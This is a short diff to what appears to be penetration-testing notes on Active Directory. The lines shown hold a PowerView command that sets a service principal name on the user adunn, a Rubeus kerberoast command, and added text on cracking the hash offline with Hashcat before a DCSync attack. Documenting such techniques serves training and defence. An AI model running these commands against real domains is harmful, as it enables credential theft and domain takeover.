@@ -262,3 +262,7 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 ```powershell
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
+
+ The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack
+
+## Cleanup
